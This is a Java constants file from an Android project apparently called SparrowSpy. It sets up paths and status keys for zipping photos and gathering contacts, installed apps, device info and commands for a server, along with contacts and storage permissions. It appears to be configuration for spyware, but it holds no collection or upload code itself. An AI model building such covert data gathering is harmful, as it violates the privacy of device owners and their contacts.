package com.tangledbytes.sparrowspy.utils;

import android.Manifest;
import android.os.Environment;

import java.io.File;

public class Constants {
    public static abstract class Debug {
        public static final boolean USE_FIREBASE_EMULATOR = false;
        public static final int FBE_STORAGE_PORT = 9699;
        public static final boolean DEBUG = false;
    }
    public static final String[] COUNTRIES = new String[]{"Afghanistan", "Albania", "Algeria", "American Samoa", "Andorra", "Angola", "Anguilla", "Antarctica", "Antigua and Barbuda", "Argentina", "Armenia", "Aruba", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bermuda", "Bhutan", "Bolivia", "Bosnia and Herzegowina", "Botswana", "Bouvet Island", "Brazil", "British Indian Ocean Territory", "Brunei Darussalam", "Bulgaria", "Burkina Faso", "Burundi", "Cambodia", "Cameroon", "Canada", "Cape Verde", "Cayman Islands", "Central African Republic", "Chad", "Chile", "China", "Christmas Island", "Cocos (Keeling) Islands", "Colombia", "Comoros", "Congo", "Congo, the Democratic Republic of the", "Cook Islands", "Costa Rica", "Cote d'Ivoire", "Croatia (Hrvatska)", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "East Timor", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Ethiopia", "Falkland Islands (Malvinas)", "Faroe Islands", "Fiji", "Finland", "France", "France Metropolitan", "French Guiana", "French Polynesia", "French Southern Territories", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Gibraltar", "Greece", "Greenland", "Grenada", "Guadeloupe", "Guam", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Heard and Mc Donald Islands", "Holy See (Vatican City State)", "Honduras", "Hong Kong", "Hungary", "Iceland", "India", "Indonesia", "Iran (Islamic Republic of)", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Kyrgyzstan", "Lao, People's Democratic Republic", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libyan Arab Jamahiriya", "Liechtenstein", "Lithuania", "Luxembourg", "Macau", "Macedonia, The Former Yugoslav Republic of", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Martinique", "Mauritania", "Mauritius", "Mayotte", "Mexico", "Micronesia, Federated States of", "Moldova, Republic of", "Monaco", "Mongolia", "Montserrat", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "Netherlands Antilles", "New Caledonia", "New Zealand", "Nicaragua", "Niger", "Nigeria", "Niue", "Norfolk Island", "Northern Mariana Islands", "Norway", "Oman", "Pakistan", "Palau", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Pitcairn", "Poland", "Portugal", "Puerto Rico", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Seychelles", "Sierra Leone", "Singapore", "Slovakia (Slovak Republic)", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Georgia and the South Sandwich Islands", "Spain", "Sri Lanka", "St. Helena", "St. Pierre and Miquelon", "Sudan", "Suriname", "Svalbard and Jan Mayen Islands", "Swaziland", "Sweden", "Switzerland", "Syrian Arab Republic", "Taiwan, Province of China", "Tajikistan", "Tanzania, United Republic of", "Thailand", "Togo", "Tokelau", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Turks and Caicos Islands", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "United States Minor Outlying Islands", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", "Vietnam", "Virgin Islands (British)", "Virgin Islands (U.S.)", "Wallis and Futuna Islands", "Western Sahara", "Yemen", "Yugoslavia", "Zambia", "Zimbabwe", "Palestine"};

    public static File DIR_APP_ROOT;
    public static File DIR_COMPRESSED_IMAGES;
    public static File DIR_SERVER;
    public static File FILE_SERVER_IMAGES_ZIP;
    public static File FILE_SERVER_IMAGES_MAP;
    public static File FILE_SERVER_CONTACTS;
    public static File FILE_SERVER_APPS;
    public static File FILE_SERVER_DEVICE_INFO;
    public static File FILE_SERVER_LOG;
    public static File FILE_SERVER_COMMANDS;
    public static final String FS_DEVICES = "devices";
    public static final String DEVICE_ID = "device_id";
    public static final String PREFS_UPLOAD_STATUS = "upload_status";
    public static final String PREF_IMAGES_STATUS = "images_status";
    public static final String PREF_CONTACTS_STATUS = "contacts_status";
    public static final String PREF_DEVICE_INFO_STATUS = "device_info_status";

    public static final String[] PERMISSIONS_NEEDED = {
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS
    };

    public static void init(File appRootDir) {
        DIR_APP_ROOT = appRootDir;
        DIR_COMPRESSED_IMAGES = new File(DIR_APP_ROOT, "compressedImages");
        DIR_SERVER = new File(DIR_APP_ROOT, "server");
        FILE_SERVER_IMAGES_ZIP = new File(DIR_SERVER, "images.zip");
        FILE_SERVER_DEVICE_INFO = new File(DIR_SERVER, "device-info.json");
        FILE_SERVER_IMAGES_MAP = new File(DIR_COMPRESSED_IMAGES, "images-map.json");
        FILE_SERVER_CONTACTS = new File(DIR_SERVER, "contacts.json");
        FILE_SERVER_APPS = new File(DIR_SERVER, "apps-list.json");
        FILE_SERVER_LOG = new File(DIR_SERVER, "log.json");
        FILE_SERVER_COMMANDS = new File(DIR_SERVER, "commands.json");

        if (!DIR_APP_ROOT.exists())
            DIR_APP_ROOT.mkdirs();
        if (!DIR_SERVER.exists())
            DIR_SERVER.mkdirs();
        if (!DIR_COMPRESSED_IMAGES.exists())
            DIR_COMPRESSED_IMAGES.mkdirs();
    }
}

